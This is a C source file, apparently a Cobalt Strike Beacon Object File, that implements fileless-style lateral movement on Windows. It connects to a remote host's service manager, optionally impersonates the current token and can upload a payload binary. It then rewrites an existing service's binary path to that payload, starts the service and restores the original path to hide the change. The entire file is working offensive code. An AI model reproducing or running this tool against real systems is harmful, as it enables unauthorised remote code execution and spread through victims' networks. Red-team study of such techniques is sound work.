// Author: Mr.Un1k0d3r RingZer0 Team

#include <windows.h>
#include <stdio.h>
#include "../_include/beacon.h"

WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ d, size_t n, const char * __restrict__ format, ...);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$QueryServiceConfigA(SC_HANDLE, LPQUERY_SERVICE_CONFIGA, DWORD, LPDWORD);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ChangeServiceConfigA(SC_HANDLE, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE,DWORD, LPCSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);

void go(char * args, int length) {
    // Parse Beacon Arguments
    datap parser;
    CHAR * targetHost;
    CHAR * serviceName;
    CHAR * payload;
    ULONG binarySize = 0;
    CHAR * binaryData = NULL;

    BeaconDataParse(&parser, args, length);
    targetHost = BeaconDataExtract(&parser, NULL);
    serviceName = BeaconDataExtract(&parser, NULL);
    payload = BeaconDataExtract(&parser, NULL);

    // Check if there's binary data (for jump mode)
    if (BeaconDataLength(&parser) > 0) {
        binaryData = BeaconDataExtract(&parser, &binarySize);
    }

    LPQUERY_SERVICE_CONFIGA lpqsc = NULL;
    DWORD dwLpqscSize = 0;
    CHAR* originalBinaryPath = NULL;
    BOOL bResult = FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "Trying to connect to %s\n", targetHost);

#ifdef _IMP
    HANDLE hToken = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "Using current process context for authentication (impersonation)\n");
    if(!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %ld\n", KERNEL32$GetLastError());
        return;
    }

    bResult = FALSE;
    bResult = ADVAPI32$ImpersonateLoggedOnUser(hToken);
    if(!bResult) {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateLoggedOnUser failed: %ld\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return;
    }
#endif

    // If binary data is provided, upload it first
    if (binaryData && binarySize > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Uploading binary (%lu bytes) to: %s\n", binarySize, payload);

        HANDLE hFile = KERNEL32$CreateFileA(payload, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "CreateFileA failed: %lu\n", KERNEL32$GetLastError());
#ifdef _IMP
            KERNEL32$CloseHandle(hToken);
#endif
            return;
        }

        DWORD bytesWritten;
        if (!KERNEL32$WriteFile(hFile, binaryData, binarySize, &bytesWritten, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "WriteFile failed: %lu\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hFile);
#ifdef _IMP
            KERNEL32$CloseHandle(hToken);
#endif
            return;
        }
        KERNEL32$CloseHandle(hFile);
        BeaconPrintf(CALLBACK_OUTPUT, "Binary uploaded successfully (%lu bytes written)\n", bytesWritten);
    }

    SC_HANDLE schManager = ADVAPI32$OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if(schManager == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManagerA failed: %ld\n", KERNEL32$GetLastError());
        if (binaryData && binarySize > 0) {
            KERNEL32$DeleteFileA(payload);
        }
#ifdef _IMP
        KERNEL32$CloseHandle(hToken);
#endif
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "SC_HANDLE Manager: 0x%p\n", schManager);

    BeaconPrintf(CALLBACK_OUTPUT, "Opening service: %s\n", serviceName);
    SC_HANDLE schService = ADVAPI32$OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);
    if(schService == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "OpenServiceA failed: %ld\n", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(schManager);
        if (binaryData && binarySize > 0) {
            KERNEL32$DeleteFileA(payload);
        }
#ifdef _IMP
        KERNEL32$CloseHandle(hToken);
#endif
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "SC_HANDLE Service: 0x%p\n", schService);

    DWORD dwSize = 0;
    ADVAPI32$QueryServiceConfigA(schService, NULL, 0, &dwSize);
    if(dwSize) {
        dwLpqscSize = dwSize;
        BeaconPrintf(CALLBACK_OUTPUT, "LPQUERY_SERVICE_CONFIGA needs 0x%08x bytes\n", dwLpqscSize);
        lpqsc = KERNEL32$GlobalAlloc(GPTR, dwSize);
        bResult = FALSE;
        bResult = ADVAPI32$QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &dwSize);
        if(bResult) {
            originalBinaryPath = lpqsc->lpBinaryPathName;
            BeaconPrintf(CALLBACK_OUTPUT, "Original service binary path: \"%s\"\n", originalBinaryPath);
        }
    }

    bResult = FALSE;
    bResult = ADVAPI32$ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
    if(!bResult) {
        BeaconPrintf(CALLBACK_ERROR, "ChangeServiceConfigA failed to update the service path: %ld\n", KERNEL32$GetLastError());
        KERNEL32$GlobalFree(lpqsc);
        ADVAPI32$CloseServiceHandle(schService);
        ADVAPI32$CloseServiceHandle(schManager);
        if (binaryData && binarySize > 0) {
            KERNEL32$DeleteFileA(payload);
        }
#ifdef _IMP
        KERNEL32$CloseHandle(hToken);
#endif
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Service path was changed to: \"%s\"\n", payload);

    bResult = FALSE;
    bResult = ADVAPI32$StartServiceA(schService, 0, NULL);
    DWORD dwResult = KERNEL32$GetLastError();
    if(!bResult && dwResult != 1053) {
        BeaconPrintf(CALLBACK_ERROR, "StartServiceA failed to start the service: %ld\n", dwResult);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Service was started\n");
    }

    if(dwLpqscSize && originalBinaryPath) {
        bResult = FALSE;
        bResult = ADVAPI32$ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
        if(!bResult) {
            BeaconPrintf(CALLBACK_ERROR, "ChangeServiceConfigA failed to revert the service path: %ld\n", KERNEL32$GetLastError());
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Service path was restored to: \"%s\"\n", originalBinaryPath);
        }
    }

    KERNEL32$GlobalFree(lpqsc);
    ADVAPI32$CloseServiceHandle(schService);
    ADVAPI32$CloseServiceHandle(schManager);
#ifdef _IMP
    KERNEL32$CloseHandle(hToken);
#endif
}
